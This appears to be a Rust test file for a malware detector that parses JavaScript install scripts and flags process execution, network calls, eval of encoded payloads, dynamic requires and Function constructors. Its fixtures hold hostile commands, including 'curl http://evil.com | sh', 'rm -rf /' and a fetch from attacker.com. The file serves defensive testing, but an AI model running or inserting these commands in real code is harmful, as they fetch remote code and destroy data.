use vk_lang_js::analyse_file;
use vk_ir::IrNodeKind;

#[test]
fn detects_process_exec_via_require_binding() {
    let src = r#"
        const cp = require('child_process');
        cp.exec('curl http://evil.com | sh');
    "#;
    let ir = analyse_file(src, "install.js");
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind,
        IrNodeKind::ProcessExec { command: Some(cmd), .. } if cmd.contains("curl")
    )), "expected ProcessExec node with curl command");
}

#[test]
fn detects_process_exec_via_destructure() {
    let src = r#"
        const { exec } = require('child_process');
        exec('rm -rf /');
    "#;
    let ir = analyse_file(src, "install.js");
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind,
        IrNodeKind::ProcessExec { command: Some(cmd), .. } if cmd.contains("rm")
    )));
}

#[test]
fn detects_network_request() {
    let src = r#"
        const https = require('https');
        https.get('https://attacker.com/payload');
    "#;
    let ir = analyse_file(src, "index.js");
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind,
        IrNodeKind::NetworkRequest { url: Some(u), .. } if u.contains("attacker")
    )));
}

#[test]
fn detects_eval() {
    let src = r#"
        const payload = atob('Y3VybCB4IHwgc2g=');
        eval(payload);
    "#;
    let ir = analyse_file(src, "lib.js");
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind, IrNodeKind::Eval { .. })));
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind, IrNodeKind::EncodedString { .. })));
}

#[test]
fn detects_dynamic_require() {
    let src = r#"
        const mod = require(process.env.MOD);
        mod.run();
    "#;
    let ir = analyse_file(src, "load.js");
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind, IrNodeKind::ObfuscatedFlow)));
}

#[test]
fn detects_function_constructor() {
    let src = r#"
        const fn = new Function('return process.exit(1)');
        fn();
    "#;
    let ir = analyse_file(src, "evil.js");
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind, IrNodeKind::FunctionConstructor { .. })));
}

#[test]
fn emits_function_nodes_for_call_graph() {
    let src = r#"
        function install() {
            const cp = require('child_process');
            cp.exec('malicious');
        }
    "#;
    let ir = analyse_file(src, "install.js");
    let has_fn = ir.nodes.iter().any(|n| matches!(&n.kind,
        IrNodeKind::Function { name: Some(n) } if n == "install"
    ));
    assert!(has_fn, "expected Function node named 'install'");
}

#[test]
fn detects_bracket_access_require() {
    let src = r#"
        const cp = require('child_process');
        cp['exec']('whoami');
    "#;
    let ir = analyse_file(src, "install.js");
    assert!(ir.nodes.iter().any(|n| matches!(&n.kind,
        IrNodeKind::ProcessExec { command: Some(cmd), .. } if cmd == "whoami"
    )));
}

#[test]
fn stable_node_ids() {
    let src = r#"
        const cp = require('child_process');
        cp.exec('id');
    "#;
    let ir1 = analyse_file(src, "install.js");
    let ir2 = analyse_file(src, "install.js");
    let ids1: Vec<&str> = ir1.nodes.iter().map(|n| n.id.as_str()).collect();
    let ids2: Vec<&str> = ir2.nodes.iter().map(|n| n.id.as_str()).collect();
    assert_eq!(ids1, ids2, "IR node ids must be deterministic");
}
